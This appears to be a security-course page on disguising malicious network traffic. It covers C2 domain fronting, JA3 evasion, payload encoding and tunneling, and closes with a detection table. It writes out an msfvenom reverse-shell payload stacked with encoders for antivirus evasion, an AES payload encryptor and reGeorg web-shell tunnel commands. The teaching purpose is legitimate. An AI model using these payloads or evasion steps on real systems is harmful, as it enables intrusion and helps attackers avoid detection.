# Traffic Obfuscation

## Unit 10 - Topic 3 | Network Defense Evasion

---

## Overview

**Traffic obfuscation** disguises malicious network traffic to look like legitimate communication, making it harder for security tools to detect and block. Techniques include encryption, encoding, domain fronting, and protocol mimicry.

---

## 1. Obfuscation Techniques

```
TRAFFIC OBFUSCATION METHODS:

ENCRYPTION:
├── TLS/SSL — Standard HTTPS encryption
├── SSH — Encrypted tunnels
├── Custom encryption — XOR, AES payload encryption
├── Certificate pinning — Prevent MITM inspection
└── WireGuard/OpenVPN — VPN tunnels

ENCODING:
├── Base64 — Encode binary in ASCII
├── Hex encoding — Numeric representation
├── URL encoding — Web-safe characters
├── Custom encoding — Proprietary schemes
└── Compression — gzip, deflate

PROTOCOL MIMICRY:
├── Look like HTTP/HTTPS traffic
├── Look like DNS queries
├── Look like cloud service traffic
├── Mimic legitimate API calls
└── Use real protocols (WebSocket, gRPC)

DOMAIN FRONTING:
├── Route through CDN (Cloudflare, AWS)
├── TLS SNI shows legitimate domain
├── HTTP Host header shows C2 domain
├── CDN routes to C2 server
└── Network monitoring sees CDN traffic only
```

---

## 2. C2 Traffic Obfuscation

```bash
# === MALLEABLE C2 (Cobalt Strike) ===
# Customize C2 traffic to look like legitimate services:

# Example: Make C2 look like Google API traffic
# Profile defines:
# ├── HTTP headers (User-Agent, Accept, etc.)
# ├── URL patterns (/api/v1/search?q=...)
# ├── POST body format (JSON/XML)
# ├── Cookie names and values
# └── Response format

# === DOMAIN FRONTING ===
# SNI: legitimate.cloudfront.net (what network sees)
# Host: c2.attacker.com (where traffic actually goes)

# Concept:
# 1. C2 server behind CDN (CloudFront, Azure CDN)
# 2. Client connects to CDN with legitimate SNI
# 3. HTTP Host header routes to C2
# 4. Network monitoring only sees CDN IP/domain

# === JA3/JA3S FINGERPRINT EVASION ===
# JA3 fingerprints TLS client hello parameters
# Security tools use JA3 to identify malicious clients

# Randomize JA3:
# ├── Use different cipher suites
# ├── Randomize TLS extensions
# ├── Match browser JA3 fingerprints
# └── Tools: jarm, ja3transport
```

---

## 3. Payload Obfuscation

```bash
# === ENCODING PAYLOADS ===
# Base64:
echo "malicious_command" | base64
# bWFsaWNpb3VzX2NvbW1hbmQ=
powershell -enc bWFsaWNpb3VzX2NvbW1hbmQ=

# XOR encryption:
# Custom XOR key applied to payload
# Decrypted at runtime — AV can't scan static content

# === MSFVENOM ENCODING ===
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=10.10.10.1 LPORT=443 \
  -e x86/shikata_ga_nai -i 7 \
  -f raw | \
msfvenom -a x86 --platform windows \
  -e x86/countdown -i 3 \
  -f exe -o multi_encoded.exe
# Multiple encoders stacked

# === CUSTOM ENCRYPTION ===
# Python payload encryptor:
from Crypto.Cipher import AES
import base64

key = b'16bytesecretkey!'
cipher = AES.new(key, AES.MODE_ECB)
encrypted = cipher.encrypt(payload_padded)
encoded = base64.b64encode(encrypted)
# Decrypt and execute at runtime

# === OBFUSCATION TOOLS ===
# Veil Framework — AV evasion payloads
# ScareCrow — EDR bypass
# Nimcrypt2 — Nim-based crypter
# ShellcodeLoader — custom loaders
```

---

## 4. Network Layer Obfuscation

```bash
# === TOR (Anonymity Network) ===
# Route through Tor for source anonymity:
proxychains -f /etc/proxychains4.conf nmap target.com
# proxychains.conf: socks5 127.0.0.1 9050 (Tor)

# === VPN CHAINING ===
# Multiple VPN layers:
# Attacker → VPN1 → VPN2 → Target
# Makes traffic tracing very difficult

# === ENCRYPTED DNS ===
# DNS over HTTPS (DoH):
# Prevents DNS query monitoring
# Configure in browser or system

# DNS over TLS (DoT):
# Encrypted DNS queries
# Port 853

# === TRAFFIC PADDING ===
# Add random data to packets:
nmap --data-length 100 target.com
# Makes packets look different from default tools

# === PROTOCOL TUNNELING ===
# HTTP tunnel (reGeorg):
# Upload tunnel.aspx to web server
# Connect through HTTP:
python reGeorgSocksProxy.py -u http://target.com/tunnel.aspx -p 1080

# Neo-reGeorg (improved):
python neoreg.py generate -k password
# Upload tunnel file
python neoreg.py -k password -u http://target.com/tunnel.php -p 1080
```

---

## 5. Detection and Countermeasures

| Obfuscation | Detection Method |
|-------------|-----------------|
| **Encrypted C2** | TLS inspection, JA3 fingerprinting |
| **Domain fronting** | SNI vs Host header mismatch |
| **DNS tunneling** | DNS query length/frequency analysis |
| **Base64 payloads** | Pattern detection, entropy analysis |
| **Protocol mimicry** | Behavioral analysis, ML models |
| **Tor** | Tor exit node IP blacklists |
| **Custom encoding** | Entropy analysis, heuristics |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Encryption** | Best basic obfuscation (HTTPS, SSH) |
| **Domain fronting** | Hide C2 behind CDN services |
| **Malleable C2** | Customize traffic to look legitimate |
| **JA3** | TLS client fingerprinting to detect tools |
| **Protocol tunneling** | Hide traffic inside allowed protocols |
| **Payload encoding** | Multiple encoders to evade static analysis |

---

## Quick Revision Questions

1. **What is domain fronting and how does it work?**
2. **How does JA3 fingerprinting detect malicious tools?**
3. **What is the purpose of Malleable C2 profiles?**
4. **How does protocol tunneling bypass firewalls?**
5. **What detection methods counter traffic obfuscation?**

---

[← Previous: Firewall Evasion](02-firewall-evasion.md) | [Next: Protocol Manipulation →](04-protocol-manipulation.md)

---

*Unit 10 - Topic 3 of 5 | [Back to README](../README.md)*
